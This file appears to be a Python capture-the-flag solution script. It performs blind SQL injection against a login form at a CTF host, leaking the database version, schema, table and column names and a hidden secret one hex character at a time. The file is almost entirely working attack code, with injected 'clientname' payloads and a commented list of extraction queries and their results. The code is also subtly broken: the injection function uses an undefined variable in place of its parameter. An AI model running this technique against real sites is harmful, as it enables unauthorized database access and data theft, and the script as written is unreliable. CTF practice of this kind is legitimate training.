import requests

def test(u):
    r = requests.post('https://vault.wpictf.xyz/login', data = {'clientname':'Goutham\' and ' + r + ';--', 'password':'suce'})
    return r.text.find("Invalid password for")

def length(s):
    l = 0
    while test("length((%s))>%d" % (s, l)):
        l += 1
    return l

def sql(s):
    h = []
    for n in range(length(s) * 2):
        for i in "6734012589ABCDEF":
            if test("substr(hex((%s)),%d,1)='%s'" % (s, n + 1, i)):
                h.append(i)
                break
    return "".join(h).decode('hex')

 
 
''' 
print "Version     :", sql("SELECT @@version") # 5.5.35-0+wheezy1
print "Database[0] :", sql("SELECT schema_name FROM information_schema.schemata limit 0,1")  # information_schema
print "Database[1] :", sql("SELECT schema_name FROM information_schema.schemata limit 1,2")  # sqli2
print "Table[0]    :", sql("SELECT table_name FROM information_schema.tables WHERE table_schema = 'sqli2' limit 0,1") # data
print "Table[1]    :", sql("SELECT table_name FROM information_schema.tables WHERE table_schema = 'sqli2' limit 1,2") # hidden
print "Columns[0]  :", sql("SELECT column_name FROM information_schema.columns WHERE table_schema = 'sqli2' AND table_name = 'hidden' limit 0,1") # id
print "Columns[1]  :", sql("SELECT column_name FROM information_schema.columns WHERE table_schema = 'sqli2' AND table_name = 'hidden' limit 1,2") # secret
print "Flag        :", sql("SELECT secret FROM hidden limit 0,1") # Vous avez fini l'autre exercice sur les sqli !
'''
